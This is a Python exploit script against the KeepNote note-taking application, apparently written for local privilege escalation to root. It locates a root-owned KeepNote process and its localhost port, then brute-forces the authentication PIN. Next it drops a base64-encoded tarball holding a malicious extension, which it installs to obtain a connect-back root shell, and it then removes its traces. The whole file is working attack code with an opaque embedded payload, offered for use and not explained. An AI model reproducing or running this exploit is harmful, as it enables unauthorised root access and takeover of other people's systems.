#!/usr/bin/env python
# -*- coding: utf-8 -*-

import subprocess
import socket
import struct
import time
import tarfile
import shutil
import os


PROC_NAME = 'keepnote'
TARGET_USER = 'root'
PIN_MAX = 1000000
LHOST = '127.0.0.1'
LPORT = 8343
FINGERPRINT = 'keepnote\n'
PROC_PATH = '/usr/bin/keepnote'
DROP_PATH = '/tmp/highjack_usr'
TMP_PATH = '/tmp/'

EXT_FILE = """H4sIAL0/eVMAA+1W62/aSBDPZ/6KkfsFTo6xeYSqgfS4CFrU5iEeqqKqsow9hr3Yu5Z3nYT762/W
NpC0tMmH9qTq/EPC+5j5zew81raaa7Za/+35t24m0+bRr4BN6HW7+ZPw9TMfO612+6TV7p10O0c2
TU66R9D9Jd58hUwqLwU4SoVQP5J7bv83hfU0/4yHwnqIo59qQyf4pNP5bv57rV6Rf8c5yeWcjt1p
H4H9U734Dv7n+e+/pWzDHaaSCT4wHMs2ALkvAsZXA2MxHx+/Nt6e1fr4oJBrmbMaQD9gvtIDGt7i
5qxU7zf1pFiWKiWGM+LrN8vxXp57MR4QnsSJSBUsJKbwvqzKA9peptYiPaCv1hhLwSFGqTA9oImx
x6IDin+WmhffU7zHpWTqkM9rpZI3zab9oCmsZSRWMhHK8kXcPMAToPRTlqjDwSrOL58GADDCO0+h
hCRldyzCYIXyMXW/WWSj33yUoxfn/6v+d13GmXJdK9n8vBp7pv/b7e7J/v7v9HT/d+1e1f//BQzD
qOVF+AExuRQK88mhToTRtrygVsvVXtVeAdyS3uIajp/VIdlzkWxS2lJQ9xvQojzny8O8od/AvOzf
og2hv23Lop/PtCjLjbjayL5BdjaWmxeQEM18zXQ7iVXqxUDDMEUEKUJ176V4ChuRge9xSDFgus+W
mUJgCjweNEUKMV2O4YZoaCnjARkhE0DksQQR5pN3lwt4hxxTL4LrbBkxHz4yn7xE8MiyXpFrDMhh
otEKY+3BrPQAxoJ4PX1LnG6vZmhtuUsi6+BJ9g4HwHguvxYJebf2lPb3nkURLBEyiWEWmcRAsvBp
Mn9/tZjD8PIGPg2n0+Hl/OaUZCkttIt3WDBR8CNGxORj6nG1IY+I4GI0PX9PGsO/Jh8n8xugCI0n
88vRbAbjqykM4Xo4nU/OFx+HU7heTK+vZiMLYIbaKST9H8QqzKNNAQlQ0c0tizPfUHokeRYFsPbu
kNLkI7sjvzzwqcCezwFxeJHgq/yEJLsP4SmwELhQJtyndN+DEt9mh7T3+TFhwn3LhK5DQh6/jSjo
M1Ifs5Cox5EQqQl/Cam06MUQ7Jbj2MdO23ZMWMyG+kDUR5BsKNS8rG5ZK54gdiMp/FtUu1m2JH99
lLt9xWLtl+5F8h53RGEq4t2qtcpYubPvGTLvR56Ujzq1vtu0douNN8UtEWAI23dEXWIUmuAlCe1C
CboYJrTLvIj9g3szrDyCWYSbip/qMEY6daDL9g/OHkAm6LOQ+fpu2dJpLRiUylbxqJez4didXI7m
ZjmdXZ1/cGfz6Wh40djp68BYMqII1LuPVtPN3uOtGXpnc46+qtcNp9WzbPo5hgmv2512o/FEWkgr
yJJW7ocV0iuZi3rDBPtFUk4DXiLWekq2T7l1Tf3M65+N5pLx5tKTa8M0jllkfDGLsA7maYaNA8eL
hMT6fgMffEzU0zgkVAmPBL4pA+tA7ve5oiWLVihf9L+vlxUqN0ByOpC52qNqSVFlKYfPdWNbpBRx
42xA/3XbhJ4OV+ML1SjTZac/G10XBgMwXJc+5bjrGgUXfRpxBcboAbnuSnnwZWTAyz+LKlSoUKFC
hQoVKlSoUKFChQoVKlSoUKFChQoVflv8C2s0C0oAKAAA"""


def get_pid(user = TARGET_USER, process_name = PROC_NAME):
    """Return pid string
    Locate processes by owner
    """
    try:
        return subprocess.check_output(['pgrep','-u', user, process_name]).strip()
    except subprocess.CalledProcessError as e:
        if e.returncode == 1:
            print '\nError: No process "%s" found.' % process_name
        else:
            print '\nERROR: %s' % e
        return -1
    except Exception as e:
        print e.args
        exit(e[0])


def get_sock(pid):
    """Return socket tuple
    Map pid to local port via /proc/<pid>/net/tcp
    """  
    path = '/proc/%s/net/tcp' % pid
    try:
        with open(path, 'r') as f:
            sock_list = f.read().strip().split('\n')
        for sock in sock_list:  #Parse for listening state && 127.0.0.01 little-endian
            if sock.split()[3] == '0A' and sock.split()[1].startswith('0100007F'):
                open_sock = sock.split()[1].split(":")
                return socket.inet_ntoa( struct.pack("<L", int(open_sock[0],16)) ), int(open_sock[1],16)
    except:
        return '-1','-1'


def crack_pin(sock_tup):
    """Return pin string
    Brute force auth pin by iterating keyspace
    """
    trigger_str = PROC_PATH + ' -l'
    pin = -1
    data_rcv = ''
    t0 = time.time()
    
    while len(data_rcv) == 0 and pin <= PIN_MAX:
        pin += 1
        test_str = '%s\n%s\n' % (pin, trigger_str) 
        print '\rAttempts: %s Time: %.2fSec Keyspace: %.2f%%' % (pin, time.time() - t0, 100.0 * pin / PIN_MAX),
        sock = socket.socket(socket.AF_INET)
        try:
            sock.connect(sock_tup)
            if fingerprint(sock):
                sock.sendall(test_str)
                data_rcv = sock.recv(64)
            sock.close()
        except socket.error as e:
            print "\nError %s: %s" % e.args
            return -1
    print ''
    if len(data_rcv) > 0:
        return pin
    else:
        return -1


def fingerprint(sock):
    """Return Bool check for KeepPote socket fingerprint
    May be slightly faster to consume in-line when cracking
    """
    try:
        if sock.recv(9) == FINGERPRINT:
            return True
        else:
            return False
    except socket.error as e:
        print "\nError %s: %s" % e.args
        return False


def drop_ext():
    """Return success Bool on drop of extension from base64 gzip tar block"""
    file_path = TMP_PATH + 'them.tgz'
    try:
        with open(file_path, 'w') as f:
            f.write(EXT_FILE.decode('base64','strict'))
        with tarfile.open(file_path, 'r:gz') as tgz_file:
            tgz_file.extractall(TMP_PATH)
        return True
    except IOError as e:
        print "\nError %s: %s" % e.args
        return False

    
def install_ext(sock_tup, pin):
    """Return success Bool of extension load"""
    cmd = PROC_PATH + ' -c tmp_ext %s\n' % DROP_PATH 
    launch_str =  '%s\n%s\n' % (pin, cmd)
    try: 
        sock = socket.socket(socket.AF_INET)
        sock.connect(sock_tup)
        if fingerprint(sock):
            sock.sendall(launch_str)
            sock.close()
            return True
        else:
            sock.close()
            return False
    except socket.error as e:
        print "\nError %s: %s" % e.args
        if sock:
            sock.close()
        return False
   

def handle_shell():
    """Primitive shell handler. No pipe or redirect support"""
    sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    try:
        sock.bind((LHOST, LPORT))
        sock.listen(0)
        remote_sock, remote_addr = sock.accept()
        print "\nGot Shell as user: " + TARGET_USER
    except socket.error as e:
        print "\nError %s: %s" % e.args
        if sock:
            sock.close()
        exit(1)

    while 1:
        try:
            cmd_str = raw_input("# ")
            if cmd_str:
                remote_sock.sendall(cmd_str + '\n')
            else:
                continue
            if cmd_str == 'exit':
                print "\nShutting down shell..."
                remote_sock.shutdown(socket.SHUT_RDWR)
                remote_sock.close()
                sock.close()
                break
            print "%s" % remote_sock.recv(1024)
        except Exception as e:
            print "\nError %s: %s" % e.args
            if remote_sock:
                remote_sock.close()
            if sock:
                sock.close()
        
            
def clean_up():
    """Return success Bool of removing tar file and folder"""
    try:
        file_path = TMP_PATH + 'them.tgz'
        os.remove(file_path)
        shutil.rmtree(DROP_PATH)
        return True
    except Exception as e:
        print "\nError %s: %s" % e.args
        return False


def print_state(is_vulnerable, pid, port):
    """Print process and isvulnerable stats"""
    print "\nVULNERABLE: %s" % is_vulnerable 
    print "USER: %s" % TARGET_USER
    print "PROC: %s" % PROC_NAME
    print "PID: %s" % pid
    print "PORT: %s" % port
     

def print_banner():
    """ANSI from http://patorjk.com/software/taag/ - patorjk@gmail.com"""
    print """
 ██╗  ██╗███████╗███████╗██████╗ ██╗   ██╗██████╗ 
 ██║ ██╔╝██╔════╝██╔════╝██╔══██╗██║   ██║██╔══██╗
 █████╔╝ █████╗  █████╗  ██████╔╝██║   ██║██████╔╝
 ██╔═██╗ ██╔══╝  ██╔══╝  ██╔═══╝ ██║   ██║██╔═══╝ 
 ██║  ██╗███████╗███████╗██║     ╚██████╔╝██║     
 ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝ ... """


def main():
    open_sock = '-1','-1'
    vulnerable = False
    print_banner()
    pid = get_pid()

    if pid == '-1':
        pass
    else:
        open_sock = get_sock(pid)
    if open_sock == ('-1','-1'):
        pass
    else:
        vulnerable = True    
    print_state(vulnerable, pid, open_sock[1])
    
    if vulnerable:
        print "\nAttempting to crack pin"
        pin = crack_pin(open_sock)
        if pin != -1:
            print "Pin Cracked: %s" % pin
        else:
            print "Pin Not Found, QQ !"
            exit()
        if not drop_ext():
            print "Failed to drop payload."
            exit()
        if not install_ext(open_sock, pin):
            print "Failed to install Extension"
            exit()
 
        print '\nExploit Succeeded. \nShell injected, waiting for connect back...'
        handle_shell()
       
        if clean_up():
            print "\nExtension cleaned from: " + DROP_PATH
        else:
            print "\nCould not remove dropped files from: " + DROP_PATH
      

if __name__ == '__main__':
        main()
